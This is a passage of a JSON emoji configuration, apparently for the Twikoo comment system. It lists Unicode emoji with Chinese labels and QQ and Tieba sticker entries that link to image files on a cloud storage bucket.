:"🤬","text":"嘴上有符号的脸"},{"icon":"💩","text":"大便"},{"icon":"🤡","text":"小丑脸"},{"icon":"👻","text":"鬼"},{"icon":"👽","text":"外星人"},{"icon":"🤖","text":"机器人"},{"icon":"😺","text":"大笑的猫"},{"icon":"😸","text":"微笑的猫"},{"icon":"😹","text":"笑出眼泪的猫"},{"icon":"😻","text":"花痴的猫"},{"icon":"😼","text":"奸笑的猫"},{"icon":"😽","text":"亲亲猫"},{"icon":"🙀","text":"疲倦的猫"},{"icon":"😿","text":"哭泣的猫"},{"icon":"😾","text":"生气的猫"},{"icon":"🙈","text":"非礼勿视"},{"icon":"🙉","text":"非礼勿听"},{"icon":"🙊","text":"非礼勿言"},{"icon":"💋","text":"唇印"},{"icon":"💖","text":"闪亮的心"},{"icon":"💔","text":"心碎"},{"icon":"❤️","text":"红心"},{"icon":"💯","text":"一百分"},{"icon":"💢","text":"怒"},{"icon":"💥","text":"爆炸"},{"icon":"💫","text":"头晕"},{"icon":"💦","text":"汗滴"},{"icon":"💤","text":"睡着"},{"icon":"👋","text":"挥手"},{"icon":"🖐️","text":"手掌"},{"icon":"👌","text":"OK"},{"icon":"🤏","text":"捏合的手势"},{"icon":"✌️","text":"胜利手势"},{"icon":"🤘","text":"摇滚"},{"icon":"🖕","text":"竖中指"},{"icon":"👍","text":"拇指向上"},{"icon":"👊","text":"出拳"},{"icon":"👏","text":"鼓掌"},{"icon":"🤝","text":"握手"},{"icon":"💪","text":"肌肉"},{"icon":"👀","text":"双眼"},{"icon":"🦋","text":"蝴蝶"},{"icon":"💐","text":"花束"},{"icon":"🌸","text":"樱花"},{"icon":"🌹","text":"玫瑰"},{"icon":"🍉","text":"西瓜"},{"icon":"🥭","text":"芒果"},{"icon":"🍗","text":"家禽的腿"},{"icon":"🥩","text":"肉块"},{"icon":"🍔","text":"汉堡"},{"icon":"🍟","text":"薯条"},{"icon":"🍕","text":"披萨"},{"icon":"🌭","text":"热狗"},{"icon":"🥚","text":"蛋"},{"icon":"🍲","text":"一锅食物"},{"icon":"🍡","text":"团子"},{"icon":"🥟","text":"饺子"},{"icon":"🍦","text":"圆筒冰激凌"},{"icon":"🍧","text":"刨冰"},{"icon":"🍨","text":"冰淇淋"},{"icon":"🎂","text":"生日蛋糕"},{"icon":"🧁","text":"纸杯蛋糕"},{"icon":"🍭","text":"棒棒糖"},{"icon":"☕","text":"热饮"},{"icon":"🍺","text":"啤酒"},{"icon":"🍻","text":"干杯"}]},"QQ":{"type":"image","container":[{"text":"QQ-OK","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/OK.gif'>"},{"text":"QQ-aini","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/aini.gif'>"},{"text":"QQ-aixin","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/aixin.gif'>"},{"text":"QQ-aoman","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/aoman.gif'>"},{"text":"QQ-baiyan","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/baiyan.gif'>"},{"text":"QQ-bangbangtang","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/bangbangtang.gif'>"},{"text":"QQ-baojin","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/baojin.gif'>"},{"text":"QQ-baoquan","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/baoquan.gif'>"},{"text":"QQ-bishi","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/bishi.gif'>"},{"text":"QQ-bizui","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/bizui.gif'>"},{"text":"QQ-cahan","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/cahan.gif'>"},{"text":"QQ-caidao","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/caidao.gif'>"},{"text":"QQ-chi","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/chi.gif'>"},{"text":"QQ-ciya","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/ciya.gif'>"},{"text":"QQ-dabing","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/dabing.gif'>"},{"text":"QQ-daku","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/daku.gif'>"},{"text":"QQ-dan","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/dan.gif'>"},{"text":"QQ-deyi","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/deyi.gif'>"},{"text":"QQ-doge","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/doge.gif'>"},{"text":"QQ-fadai","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/fadai.gif'>"},{"text":"QQ-fanu","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/fanu.gif'>"},{"text":"QQ-fendou","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/fendou.gif'>"},{"text":"QQ-ganga","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/ganga.gif'>"},{"text":"QQ-gouyin","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/gouyin.gif'>"},{"text":"QQ-guzhang","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/guzhang.gif'>"},{"text":"QQ-haixiu","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/haixiu.gif'>"},{"text":"QQ-hanxiao","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/hanxiao.gif'>"},{"text":"QQ-haobang","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/haobang.gif'>"},{"text":"QQ-haqian","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/haqian.gif'>"},{"text":"QQ-hecai","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/hecai.gif'>"},{"text":"QQ-hexie","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/hexie.gif'>"},{"text":"QQ-huaixiao","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/huaixiao.gif'>"},{"text":"QQ-jie","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/jie.gif'>"},{"text":"QQ-jingkong","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/jingkong.gif'>"},{"text":"QQ-jingxi","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/jingxi.gif'>"},{"text":"QQ-jingya","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/jingya.gif'>"},{"text":"QQ-juhua","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/juhua.gif'>"},{"text":"QQ-keai","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/keai.gif'>"},{"text":"QQ-kelian","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/kelian.gif'>"},{"text":"QQ-koubi","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/koubi.gif'>"},{"text":"QQ-ku","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/ku.gif'>"},{"text":"QQ-kuaikule","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/kuaikule.gif'>"},{"text":"QQ-kulou","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/kulou.gif'>"},{"text":"QQ-kun","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/kun.gif'>"},{"text":"QQ-lanqiu","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/lanqiu.gif'>"},{"text":"QQ-leiben","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/leiben.gif'>"},{"text":"QQ-lenghan","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/lenghan.gif'>"},{"text":"QQ-liuhan","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/liuhan.gif'>"},{"text":"QQ-liulei","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/liulei.gif'>"},{"text":"QQ-nanguo","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/nanguo.gif'>"},{"text":"QQ-penxue","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/penxue.gif'>"},{"text":"QQ-piezui","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/piezui.gif'>"},{"text":"QQ-pijiu","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/pijiu.gif'>"},{"text":"QQ-qiang","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/qiang.gif'>"},{"text":"QQ-qiaoda","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/qiaoda.gif'>"},{"text":"QQ-qinqin","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/qinqin.gif'>"},{"text":"QQ-qiudale","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/qiudale.gif'>"},{"text":"QQ-quantou","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/quantou.gif'>"},{"text":"QQ-saorao","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/saorao.gif'>"},{"text":"QQ-se","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/se.gif'>"},{"text":"QQ-shengli","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/shengli.gif'>"},{"text":"QQ-shouqiang","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/shouqiang.gif'>"},{"text":"QQ-shuai","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/shuai.gif'>"},{"text":"QQ-shui","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/shui.gif'>"},{"text":"QQ-tiaopi","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/tiaopi.gif'>"},{"text":"QQ-touxiao","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/touxiao.gif'>"},{"text":"QQ-tu","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/tu.gif'>"},{"text":"QQ-tuosai","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/tuosai.gif'>"},{"text":"QQ-weiqu","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/weiqu.gif'>"},{"text":"QQ-weixiao","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/weixiao.gif'>"},{"text":"QQ-woshou","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/woshou.gif'>"},{"text":"QQ-wozuimei","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/wozuimei.gif'>"},{"text":"QQ-wunai","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/wunai.gif'>"},{"text":"QQ-xia","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/xia.gif'>"},{"text":"QQ-xiaojiujie","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/xiaojiujie.gif'>"},{"text":"QQ-xiaoku","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/xiaoku.gif'>"},{"text":"QQ-xiaoyanger","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/xiaoyanger.gif'>"},{"text":"QQ-xieyanxiao","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/xieyanxiao.gif'>"},{"text":"QQ-xigua","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/xigua.gif'>"},{"text":"QQ-xu","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/xu.gif'>"},{"text":"QQ-yangtuo","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/yangtuo.gif'>"},{"text":"QQ-yinxian","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/yinxian.gif'>"},{"text":"QQ-yiwen","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/yiwen.gif'>"},{"text":"QQ-youhengheng","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/youhengheng.gif'>"},{"text":"QQ-youling","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/youling.gif'>"},{"text":"QQ-yun","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/yun.gif'>"},{"text":"QQ-zaijian","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/zaijian.gif'>"},{"text":"QQ-zhayanjian","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/zhayanjian.gif'>"},{"text":"QQ-zhemo","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/zhemo.gif'>"},{"text":"QQ-zhouma","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/zhouma.gif'>"},{"text":"QQ-zhuakuang","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/zhuakuang.gif'>"},{"text":"QQ-zuohengheng","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/QQ/zuohengheng.gif'>"}]},"贴吧":{"type":"image","container":[{"text":"Tieba-New-1","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon.png'>"},{"text":"Tieba-New-2","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon10.png'>"},{"text":"Tieba-New-3","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon100.png'>"},{"text":"Tieba-New-4","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon101.png'>"},{"text":"Tieba-New-5","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon102.png'>"},{"text":"Tieba-New-6","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon103.png'>"},{"text":"Tieba-New-7","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon104.png'>"},{"text":"Tieba-New-8","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon105.png'>"},{"text":"Tieba-New-9","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon106.png'>"},{"text":"Tieba-New-10","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon107.png'>"},{"text":"Tieba-New-11","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon108.png'>"},{"text":"Tieba-New-12","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon109.png'>"},{"text":"Tieba-New-13","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon11.png'>"},{"text":"Tieba-New-14","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon110.png'>"},{"text":"Tieba-New-15","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon111.png'>"},{"text":"Tieba-New-16","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon112.png'>"},{"text":"Tieba-New-17","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon113.png'>"},{"text":"Tieba-New-18","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon114.png'>"},{"text":"Tieba-New-19","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon115.png'>"},{"text":"Tieba-New-20","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon116.png'>"},{"text":"Tieba-New-21","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon117.png'>"},{"text":"Tieba-New-22","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon118.png'>"},{"text":"Tieba-New-23","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon119.png'>"},{"text":"Tieba-New-24","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon12.png'>"},{"text":"Tieba-New-25","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon120.png'>"},{"text":"Tieba-New-26","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon121.png'>"},{"text":"Tieba-New-27","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon122.png'>"},{"text":"Tieba-New-28","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon123.png'>"},{"text":"Tieba-New-29","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon124.png'>"},{"text":"Tieba-New-30","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon13.png'>"},{"text":"Tieba-New-31","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon14.png'>"},{"text":"Tieba-New-32","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon15.png'>"},{"text":"Tieba-New-33","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon16.png'>"},{"text":"Tieba-New-34","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon17.png'>"},{"text":"Tieba-New-35","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon18.png'>"},{"text":"Tieba-New-36","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon19.png'>"},{"text":"Tieba-New-37","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon2.png'>"},{"text":"Tieba-New-38","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon20.png'>"},{"text":"Tieba-New-39","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon21.png'>"},{"text":"Tieba-New-40","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon22.png'>"},{"text":"Tieba-New-41","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon23.png'>"},{"text":"Tieba-New-42","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon24.png'>"},{"text":"Tieba-New-43","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon25.png'>"},{"text":"Tieba-New-44","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon26.png'>"},{"text":"Tieba-New-45","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon27.png'>"},{"text":"Tieba-New-46","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon28.png'>"},{"text":"Tieba-New-47","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon29.png'>"},{"text":"Tieba-New-48","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon3.png'>"},{"text":"Tieba-New-49","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon30.png'>"},{"text":"Tieba-New-50","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon31.png'>"},{"text":"Tieba-New-51","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon32.png'>"},{"text":"Tieba-New-52","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon33.png'>"},{"text":"Tieba-New-53","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon34.png'>"},{"text":"Tieba-New-54","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon35.png'>"},{"text":"Tieba-New-55","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon36.png'>"},{"text":"Tieba-New-56","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon37.png'>"},{"text":"Tieba-New-57","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon38.png'>"},{"text":"Tieba-New-58","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon39.png'>"},{"text":"Tieba-New-59","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon4.png'>"},{"text":"Tieba-New-60","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon40.png'>"},{"text":"Tieba-New-61","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon41.png'>"},{"text":"Tieba-New-62","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon42.png'>"},{"text":"Tieba-New-63","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon43.png'>"},{"text":"Tieba-New-64","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon44.png'>"},{"text":"Tieba-New-65","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon45.png'>"},{"text":"Tieba-New-66","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon46.png'>"},{"text":"Tieba-New-67","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon47.png'>"},{"text":"Tieba-New-68","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon48.png'>"},{"text":"Tieba-New-69","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon49.png'>"},{"text":"Tieba-New-70","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon5.png'>"},{"text":"Tieba-New-71","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon50.png'>"},{"text":"Tieba-New-72","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon6.png'>"},{"text":"Tieba-New-73","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon66.png'>"},{"text":"Tieba-New-74","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon67.png'>"},{"text":"Tieba-New-75","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon68.png'>"},{"text":"Tieba-New-76","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon69.png'>"},{"text":"Tieba-New-77","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon7.png'>"},{"text":"Tieba-New-78","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon70.png'>"},{"text":"Tieba-New-79","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon71.png'>"},{"text":"Tieba-New-80","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon72.png'>"},{"text":"Tieba-New-81","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon73.png'>"},{"text":"Tieba-New-82","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon74.png'>"},{"text":"Tieba-New-83","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon75.png'>"},{"text":"Tieba-New-84","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon76.png'>"},{"text":"Tieba-New-85","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon77.png'>"},{"text":"Tieba-New-86","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon78.png'>"},{"text":"Tieba-New-87","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon79.png'>"},{"text":"Tieba-New-88","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon8.png'>"},{"text":"Tieba-New-89","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon80.png'>"},{"text":"Tieba-New-90","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon81.png'>"},{"text":"Tieba-New-91","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon82.png'>"},{"text":"Tieba-New-92","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon83.png'>"},{"text":"Tieba-New-93","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon84.png'>"},{"text":"Tieba-New-94","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon85.png'>"},{"text":"Tieba-New-95","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon86.png'>"},{"text":"Tieba-New-96","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon87.png'>"},{"text":"Tieba-New-97","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon88.png'>"},{"text":"Tieba-New-98","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon89.png'>"},{"text":"Tieba-New-99","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon9.png'>"},{"text":"Tieba-New-100","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon90.png'>"},{"text":"Tieba-New-101","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon91.png'>"},{"text":"Tieba-New-102","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon92.png'>"},{"text":"Tieba-New-103","icon":"<img src='https://twikoo-magic.oss-cn-hangzhou.aliyuncs.com/Tieba-New/image_emoticon93.png'>"},{"text":"Tieba-New-104","icon":"<img 